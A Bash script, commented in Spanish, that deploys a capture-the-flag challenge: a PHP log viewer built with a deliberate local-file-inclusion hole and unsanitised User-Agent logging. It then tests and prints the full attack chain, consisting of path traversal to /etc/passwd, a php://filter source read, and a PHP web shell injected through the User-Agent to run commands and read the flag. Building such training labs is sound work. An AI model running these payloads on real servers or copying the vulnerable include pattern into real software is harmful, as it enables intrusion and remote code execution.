#!/bin/bash
# =============================================================================
# CTF MGP - RETO 4: LFI + Log Poisoning → RCE (Intermedio)
# Puerto: 80  |  Path: /lfi/
# Sin DB  |  Flag: Comciberdef{lfi_log_poison_rce_2026}
# Cadena de explotación:
#   1. LFI básico → leer index.php (php://filter)
#   2. Descubrir /var/log/app/access.log
#   3. Envenenar User-Agent con <?php system($_GET['cmd']); ?>
#   4. Incluir log via LFI + ejecutar cmd=cat /flag.txt
# =============================================================================
set -e

VERDE="\e[32m"
AMARILLO="\e[33m"
ROJO="\e[31m"
RESET="\e[0m"

echo -e "${VERDE}[*] RETO 4 — LFI + Log Poisoning: iniciando despliegue...${RESET}"

# -----------------------------------------------------------------------------
# 1. Directorio de logs personalizado
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Creando directorio de logs de aplicación...${RESET}"
mkdir -p /var/log/app
touch /var/log/app/access.log

# www-data necesita escribir el log; participante puede leerlo via LFI
chown www-data:www-data /var/log/app/access.log
chmod 666 /var/log/app/access.log          # lectura+escritura para www-data y root
echo -e "${VERDE}    [OK] /var/log/app/access.log creado con permisos correctos${RESET}"

# Poblar el log con entradas de ruido convincentes
cat > /var/log/app/access.log <<'LOGEOF'
[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0)" 200
[2026-01-15 08:13:22] 192.168.125.50 GET /lfi/?page=news "Mozilla/5.0 (X11; Linux x86_64)" 200
[2026-01-15 08:15:45] 192.168.125.40 GET /lfi/?page=contact "Mozilla/5.0 (Windows NT 10.0)" 200
[2026-01-15 09:02:11] 192.168.125.1  GET /lfi/?page=admin "Mozilla/5.0 (compatible; scan)" 404
[2026-01-15 09:03:18] 192.168.125.1  GET /lfi/?page=../../../etc/passwd "python-requests/2.28" 200
[2026-01-15 09:04:55] 192.168.125.1  GET /lfi/?page=../../../etc/shadow "python-requests/2.28" 500
[2026-01-15 09:10:00] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0)" 200
LOGEOF

chown www-data:www-data /var/log/app/access.log
echo -e "${VERDE}    [OK] Log de aplicación poblado con entradas de muestra${RESET}"

# -----------------------------------------------------------------------------
# 2. Flag en /flag.txt (accesible por www-data, que tiene permisos restringidos)
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Colocando flag en /flag.txt...${RESET}"
echo "Comciberdef{lfi_log_poison_rce_2026}" > /flag.txt
chmod 444 /flag.txt        # Solo lectura para todos — www-data puede leerlo
chown root:root /flag.txt
echo -e "${VERDE}    [OK] /flag.txt creado (readable por www-data)${RESET}"

# -----------------------------------------------------------------------------
# 3. Aplicación PHP vulnerable a LFI
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Desplegando aplicación LFI...${RESET}"
mkdir -p /var/www/html/lfi

# ---------- Páginas de contenido (incluidas normalmente) ----------
mkdir -p /var/www/html/lfi/pages

cat > /var/www/html/lfi/pages/home.php <<'PHPEOF'
<div class="content-area">
  <h2>Sistema de Gestión de Accesos — COMCIBERDEF</h2>
  <p>Bienvenido al portal de logs de acceso. Desde aquí puedes consultar
     los registros de actividad del sistema de monitoreo perimetral.</p>
  <p style="margin-top:12px">Selecciona una sección del menú lateral para continuar.</p>
</div>
PHPEOF

cat > /var/www/html/lfi/pages/news.php <<'PHPEOF'
<div class="content-area">
  <h2>Novedades del Sistema</h2>
  <p>v2.3.1 — Actualización de módulo de logging implementada el 15/01/2026.</p>
  <p style="margin-top:8px">Los registros de acceso ahora se almacenan en
     <code>/var/log/app/access.log</code> con formato extendido.</p>
  <p style="margin-top:8px;color:#c53030">
    <strong>Aviso:</strong> El visor de logs está en mantenimiento.
    Acceder directamente al archivo si es necesario.
  </p>
</div>
PHPEOF

cat > /var/www/html/lfi/pages/contact.php <<'PHPEOF'
<div class="content-area">
  <h2>Contacto — Soporte Técnico</h2>
  <p>Para incidentes de seguridad: soporte@comciberdef.mil.pe</p>
  <p style="margin-top:8px">Horario: Lunes a Viernes, 08:00 – 18:00</p>
</div>
PHPEOF

# ---------- index.php — VULNERABLE a LFI ----------
cat > /var/www/html/lfi/index.php <<'PHPEOF'
<?php
// Módulo de logging de accesos
$log_file = '/var/log/app/access.log';
$ip       = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$page     = $_GET['page'] ?? 'home';
$uri      = $_SERVER['REQUEST_URI'] ?? '/';
$ts       = date('Y-m-d H:i:s');

// *** LOG POISONING POINT ***
// El User-Agent se escribe tal cual en el log — sin sanitizar
$log_entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// *** LFI VULNERABLE ***
// include($_GET['page'] . '.php') — permite path traversal
// Y también: include($_GET['page']) si no tiene extensión (para logs)
if (strpos($page, '/') !== false || strpos($page, '..') !== false) {
    // Rutas absolutas y traversal — include directo (LFI puro)
    @include($page);
} else {
    // Rutas relativas — añade .php (comportamiento "normal")
    @include("pages/" . $page . ".php");
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>COMCIBERDEF — Visor de Logs de Acceso</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#1a1a2e;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#16213e;border-bottom:2px solid #0f3460;
         padding:14px 32px;display:flex;align-items:center;gap:16px}
  header h1{font-size:18px;color:#e94560;font-weight:700;letter-spacing:1px}
  header span{font-size:11px;color:#718096;margin-left:auto}
  .layout{display:flex;min-height:calc(100vh - 52px)}
  .sidebar{width:220px;background:#16213e;border-right:1px solid #0f3460;padding:20px}
  .sidebar h3{font-size:11px;text-transform:uppercase;letter-spacing:1px;
              color:#718096;margin-bottom:12px}
  .sidebar a{display:block;padding:9px 12px;border-radius:6px;color:#a0aec0;
             font-size:13px;text-decoration:none;margin-bottom:4px;transition:.15s}
  .sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
  .main{flex:1;padding:28px}
  .content-area{background:#16213e;border:1px solid #0f3460;border-radius:10px;
                padding:28px;line-height:1.7}
  .content-area h2{color:#e94560;margin-bottom:14px;font-size:18px}
  .content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
  .content-area code{background:#0f3460;padding:2px 6px;border-radius:4px;
                     font-family:monospace;color:#63b3ed;font-size:13px}
  .meta{font-size:11px;color:#4a5568;margin-top:24px;padding-top:12px;
        border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>&#9632; COMCIBERDEF — Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO — ACCESO RESTRINGIDO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegación</h3>
    <a href="?page=home"    class="<?= ($page==='home')?'active':'' ?>">&#127968; Inicio</a>
    <a href="?page=news"    class="<?= ($page==='news')?'active':'' ?>">&#128240; Novedades</a>
    <a href="?page=contact" class="<?= ($page==='contact')?'active':'' ?>">&#128222; Soporte</a>
    <div style="margin-top:24px;padding-top:16px;border-top:1px solid #0f3460">
      <h3>Herramientas</h3>
      <a href="?page=home">&#128196; Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <!-- El include() del principio ya ejecutó la página -->
    <?php if (!strpos($page, '/') && !strpos($page, '..') && !in_array($page,['home','news','contact'])): ?>
    <div class="content-area">
      <h2>Página no encontrada</h2>
      <p>La sección solicitada no existe.</p>
    </div>
    <?php endif; ?>
    <div class="meta">Log: <?= htmlspecialchars($log_file) ?> &nbsp;|&nbsp; IP: <?= htmlspecialchars($ip) ?></div>
  </div>
</div>
</body>
</html>
PHPEOF

# Permisos
chown -R www-data:www-data /var/www/html/lfi
chmod -R 750 /var/www/html/lfi

echo -e "${VERDE}    [OK] Aplicación LFI desplegada${RESET}"

# -----------------------------------------------------------------------------
# 4. Verificación de la cadena completa de explotación
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Verificando cadena de explotación...${RESET}"
sleep 1

# Paso 1: LFI básico — leer /etc/passwd
LFI_TEST=$(curl -s "http://localhost/lfi/?page=../../../etc/passwd" 2>/dev/null | grep -c "root" || true)
if [ "$LFI_TEST" -gt 0 ]; then
    echo -e "${VERDE}    [OK] LFI básico funciona — /etc/passwd legible${RESET}"
else
    echo -e "${ROJO}    [WARN] LFI básico no funcionó — verificar index.php${RESET}"
fi

# Paso 2: Log poisoning — envenenar con PHP
curl -s -A '<?php system($_GET["cmd"]); ?>' \
     "http://localhost/lfi/?page=home" > /dev/null 2>&1
sleep 0.5

# Paso 3: Ejecutar comando via LFI + log
RCE_TEST=$(curl -s "http://localhost/lfi/?page=/var/log/app/access.log&cmd=id" 2>/dev/null | grep -c "www-data" || true)
if [ "$RCE_TEST" -gt 0 ]; then
    echo -e "${VERDE}    [OK] Log Poisoning + RCE funciona — 'id' ejecutado${RESET}"
else
    echo -e "${AMARILLO}    [INFO] RCE puede requerir segunda petición — verificar manualmente${RESET}"
fi

# Paso 4: Leer flag
FLAG_TEST=$(curl -s "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" 2>/dev/null | grep -c "Comciberdef" || true)
if [ "$FLAG_TEST" -gt 0 ]; then
    echo -e "${VERDE}    [OK] Flag accesible via RCE${RESET}"
else
    echo -e "${AMARILLO}    [INFO] Flag: probar tras limpiar log si hay PHP residual${RESET}"
fi

# Limpiar el log de los payloads de prueba y poblar con entradas limpias
cat > /var/log/app/access.log <<'LOGEOF'
[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 200
[2026-01-15 08:13:22] 192.168.125.50 GET /lfi/?page=news "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" 200
[2026-01-15 08:15:45] 192.168.125.40 GET /lfi/?page=contact "Mozilla/5.0 (Windows NT 10.0)" 200
[2026-01-15 09:02:11] 192.168.125.1  GET /lfi/?page=admin "Mozilla/5.0 (compatible; Googlebot/2.1)" 404
[2026-01-15 09:10:00] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0)" 200
LOGEOF
chown www-data:www-data /var/log/app/access.log
echo -e "${VERDE}    [OK] Log limpiado — listo para el reto${RESET}"

echo ""
echo -e "${VERDE}============================================================${RESET}"
echo -e "${VERDE} RETO 4 - LFI + Log Poisoning DESPLEGADO${RESET}"
echo -e "${VERDE}============================================================${RESET}"
echo -e " URL:      http://192.168.125.150/lfi/"
echo -e " Flag:     Comciberdef{lfi_log_poison_rce_2026}"
echo -e " Cadena:"
echo -e "   1. LFI: ?page=../../../etc/passwd"
echo -e "   2. Fuente: ?page=php://filter/convert.base64-encode/resource=index"
echo -e "   3. Poisoning: curl -A '<?php system(\$_GET[\"cmd\"]); ?>' URL"
echo -e "   4. RCE: ?page=/var/log/app/access.log&cmd=cat+/flag.txt"
echo -e "${VERDE}============================================================${RESET}"
